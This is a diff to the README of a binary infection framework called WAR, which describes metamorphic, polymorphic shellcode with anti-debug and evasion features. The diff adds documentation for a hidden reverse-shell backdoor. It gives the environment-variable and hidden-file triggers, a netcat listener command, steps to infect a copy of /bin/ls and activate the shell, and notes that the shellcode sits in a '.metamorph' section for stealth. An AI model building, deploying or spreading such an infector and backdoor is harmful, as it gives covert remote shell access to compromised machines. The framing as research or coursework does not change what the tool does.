@@ -36,7 +36,8 @@ WAR is a sophisticated binary research framework developed to explore advanced c
 │  ├─ Self-modifying Code Generation                      │
 │  ├─ Polymorphic Shellcode Builder                       │
 │  ├─ Execution Order Randomization                       │
-│  └─ Garbage Code Insertion                              │
+│  ├─ Garbage Code Insertion                              │
+│  └─ Reverse Shell Backdoor (trigger-based activation)   │
 ├─────────────────────────────────────────────────────────┤
 │  Scanning Module                                         │
 │  ├─ Recursive Directory Scanner                         │
@@ -78,6 +79,11 @@ WAR is a sophisticated binary research framework developed to explore advanced c
 - **Execution Flow Randomization**: Non-deterministic control flow patterns
 - **Garbage Code Insertion**: Statistical analysis evasion
 - **Self-Mutation Capabilities**: Runtime code morphing
+- **Reverse Shell Backdoor**: Trigger-based remote shell with system information banner
+  - Environment variable activation (`WAR_ACTIVATE=1`)
+  - File-based trigger (`/tmp/.war_trigger`)
+  - Syscall-only implementation (no libc dependencies)
+  - Connection banner with hostname, UID, and working directory
 
 #### 5. **Code Obfuscation System**
 - **Reversible Identifier Obfuscation**: JSON-based mapping for 100% deobfuscation
@@ -260,6 +266,76 @@ Edit [include/config.h](include/config.h) to customize behavior:
 - Target directories
 - Debug output levels
 - Anti-debug sensitivity
+
+### Testing the Backdoor
+
+The metamorphic engine includes a reverse shell backdoor that can be activated through multiple triggers:
+
+#### Setting up the Listener
+```bash
+# Terminal 1: Start netcat listener
+nc -lvp 4444
+```
+
+#### Activation Methods
+
+**Method 1: Environment Variable Trigger**
+```bash
+# Terminal 2: Execute infected binary with environment variable
+WAR_ACTIVATE=1 /path/to/infected/binary
+```
+
+**Method 2: File-Based Trigger**
+```bash
+# Terminal 2: Create trigger file, then execute
+touch /tmp/.war_trigger
+/path/to/infected/binary
+# Note: The trigger file is automatically deleted after detection
+```
+
+#### Expected Output
+When the backdoor activates, you'll see in your netcat listener:
+```
+Connection from 127.0.0.1:XXXXX
+
+WAR-Reverse Shell by jainavas & jvidal-t
+
+Host: hostname
+UID: 1000
+CWD: /path/to/current/directory
+==================
+
+$ 
+```
+
+#### Security Notes
+- The backdoor connects to `127.0.0.1:4444` by default
+- Uses `fork()` to daemonize, allowing the parent process to continue normally
+- Implements pure syscall-based communication (no libc dependencies)
+- Shellcode is embedded in the `.metamorph` section for stealth
+- Connection information helps identify the compromised system
+
+#### Testing in Safe Environment
+```bash
+# Complete test workflow
+# 1. Build the project
+make clean && make
+
+# 2. Prepare test environment
+mkdir -p /tmp/test
+cp /bin/ls /tmp/test/
+
+# 3. Infect a binary
+./war /tmp/test/
+
+# 4. Start listener (in another terminal)
+nc -lvp 4444
+
+# 5. Trigger the backdoor
+WAR_ACTIVATE=1 /tmp/test/ls
+# OR
+touch /tmp/.war_trigger && /tmp/test/ls
+```
 
 ## 📊 Performance Metrics
 
